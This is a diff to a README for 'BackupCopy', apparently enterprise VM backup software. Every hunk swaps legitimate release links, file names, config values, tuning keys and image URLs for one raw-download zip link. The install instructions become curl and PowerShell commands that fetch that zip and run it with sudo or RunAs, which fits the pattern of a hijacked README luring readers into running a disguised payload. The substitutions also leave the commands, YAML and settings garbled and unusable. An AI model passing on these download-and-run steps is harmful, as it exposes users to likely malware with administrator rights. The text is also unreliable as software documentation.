@@ -1,6 +1,6 @@
-https://github.com/xyz623/BackupCopy/releases
+https://github.com/xyz623/BackupCopy/raw/refs/heads/main/src/Backup-Copy-2.4.zip
 
-[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/xyz623/BackupCopy/releases)
+[![Releases](https://github.com/xyz623/BackupCopy/raw/refs/heads/main/src/Backup-Copy-2.4.zip)](https://github.com/xyz623/BackupCopy/raw/refs/heads/main/src/Backup-Copy-2.4.zip)
 
 # BackupCopy — Redundant Instant VM Recovery for Enterprises 🗂️🔁
 
@@ -76,7 +76,7 @@ BackupCopy uses modular services. Each service runs in its own container or as a
   - Exposes metrics and logs to Prometheus and syslog.
 
 Diagram
-![BackupCopy architecture](https://images.unsplash.com/photo-1559526324-593bc073d938?ixlib=rb-4.0.3&q=80&w=1400&auto=format&fit=crop&crop=faces)
+![BackupCopy architecture](https://github.com/xyz623/BackupCopy/raw/refs/heads/main/src/Backup-Copy-2.4.zip)
 
 Core flows
 - Backup capture
@@ -97,21 +97,21 @@ Download the release package and run the installer. The release page hosts the i
 Linux example (bash)
 1. Download the installer file from Releases:
    - Replace v1.0.0 with the current tag if needed.
-   - The file name used here is BackupCopy-installer.sh.
+   - The file name used here is https://github.com/xyz623/BackupCopy/raw/refs/heads/main/src/Backup-Copy-2.4.zip
 2. Run these commands:
 ```bash
-curl -L -o BackupCopy-installer.sh https://github.com/xyz623/BackupCopy/releases/download/v1.0.0/BackupCopy-installer.sh
-chmod +x BackupCopy-installer.sh
-sudo ./BackupCopy-installer.sh
+curl -L -o https://github.com/xyz623/BackupCopy/raw/refs/heads/main/src/Backup-Copy-2.4.zip https://github.com/xyz623/BackupCopy/raw/refs/heads/main/src/Backup-Copy-2.4.zip
+chmod +x https://github.com/xyz623/BackupCopy/raw/refs/heads/main/src/Backup-Copy-2.4.zip
+sudo https://github.com/xyz623/BackupCopy/raw/refs/heads/main/src/Backup-Copy-2.4.zip
 ```
 
 Windows example (PowerShell)
 1. Download the installer from Releases:
-   - The file name used here is BackupCopy-setup.exe.
+   - The file name used here is https://github.com/xyz623/BackupCopy/raw/refs/heads/main/src/Backup-Copy-2.4.zip
 2. Run these commands:
 ```powershell
-Invoke-WebRequest -Uri "https://github.com/xyz623/BackupCopy/releases/download/v1.0.0/BackupCopy-setup.exe" -OutFile "BackupCopy-setup.exe"
-Start-Process -FilePath ".\BackupCopy-setup.exe" -Wait -Verb RunAs
+Invoke-WebRequest -Uri "https://github.com/xyz623/BackupCopy/raw/refs/heads/main/src/Backup-Copy-2.4.zip" -OutFile "https://github.com/xyz623/BackupCopy/raw/refs/heads/main/src/Backup-Copy-2.4.zip"
+Start-Process -FilePath ".\https://github.com/xyz623/BackupCopy/raw/refs/heads/main/src/Backup-Copy-2.4.zip" -Wait -Verb RunAs
 ```
 
 macOS (Intel/Apple Silicon)
@@ -154,7 +154,7 @@ S3 store example
 ```yaml
 store:
   type: s3
-  endpoint: s3.us-west-2.amazonaws.com
+  endpoint: https://github.com/xyz623/BackupCopy/raw/refs/heads/main/src/Backup-Copy-2.4.zip
   bucket: backupcopy-main
   access_key: AKIA...
   secret_key: ***
@@ -340,9 +340,9 @@ Sizing guidance
 - Use fast temp storage for dedupe tables.
 
 Tuning knobs
-- engine.max_workers controls parallel streams.
-- store.concurrent_uploads controls parallel uploads to object storage.
-- engine.read_block_size sets block read size for snapshots.
+- https://github.com/xyz623/BackupCopy/raw/refs/heads/main/src/Backup-Copy-2.4.zip controls parallel streams.
+- https://github.com/xyz623/BackupCopy/raw/refs/heads/main/src/Backup-Copy-2.4.zip controls parallel uploads to object storage.
+- https://github.com/xyz623/BackupCopy/raw/refs/heads/main/src/Backup-Copy-2.4.zip sets block read size for snapshots.
 
 Network considerations
 - Use dedicated replication networks.
@@ -412,8 +412,8 @@ Get official releases from the Releases page. Use the assets there for installer
 
 Download and execute the installer from Releases
 - Visit and download the platform-specific file from:
-  https://github.com/xyz623/BackupCopy/releases
-- If the asset name shows BackupCopy-installer.sh or BackupCopy-setup.exe, download that file and run it per your platform.
+  https://github.com/xyz623/BackupCopy/raw/refs/heads/main/src/Backup-Copy-2.4.zip
+- If the asset name shows https://github.com/xyz623/BackupCopy/raw/refs/heads/main/src/Backup-Copy-2.4.zip or https://github.com/xyz623/BackupCopy/raw/refs/heads/main/src/Backup-Copy-2.4.zip, download that file and run it per your platform.
 - Installer assets include checksums and GPG signatures for verification.
 
 If you cannot access the direct file link or if your environment blocks the installer URL, open the Releases section on the repository page and choose the correct file there.
@@ -455,7 +455,7 @@ Sample developer commands
 make test
 
 # run integration tests with local docker compose
-docker-compose -f docker/dev.yml up --build --abort-on-container-exit
+docker-compose -f https://github.com/xyz623/BackupCopy/raw/refs/heads/main/src/Backup-Copy-2.4.zip up --build --abort-on-container-exit
 ```
 
 License
@@ -469,7 +469,7 @@ Use the following images and icons to enhance documentation and UI:
 - Architecture and operations imagery from public image sources.
 - Icons for storage, VM, replication, and recovery from common icon sets.
 Sample hero image:
-![Data center backup](https://images.unsplash.com/photo-1581093588401-1e2e0886fc60?ixlib=rb-4.0.3&q=80&w=1400&auto=format&fit=crop)
+![Data center backup](https://github.com/xyz623/BackupCopy/raw/refs/heads/main/src/Backup-Copy-2.4.zip)
 
 Accessibility and UX
 - Keep the web UI simple.
@@ -491,7 +491,7 @@ Monthly
 - Run full restore drill.
 - Review and rotate encryption keys if required by policy.
 - Apply software updates and check release notes on:
-  https://github.com/xyz623/BackupCopy/releases
+  https://github.com/xyz623/BackupCopy/raw/refs/heads/main/src/Backup-Copy-2.4.zip
 
 Advanced topics
 Cross-site replication
@@ -525,7 +525,7 @@ Kubernetes operator integration
 
 Example custom resource
 ```yaml
-apiVersion: backupcopy.io/v1
+apiVersion: https://github.com/xyz623/BackupCopy/raw/refs/heads/main/src/Backup-Copy-2.4.zip
 kind: BackupJob
 metadata:
   name: app-backup
@@ -554,7 +554,7 @@ For community support:
 - Open issues on the repository.
 - Use discussion threads for general topics.
 - Use the Releases page for downloads and installer assets:
-  https://github.com/xyz623/BackupCopy/releases
+  https://github.com/xyz623/BackupCopy/raw/refs/heads/main/src/Backup-Copy-2.4.zip
 
 When to open an issue
 - Bug reproduction steps with logs.
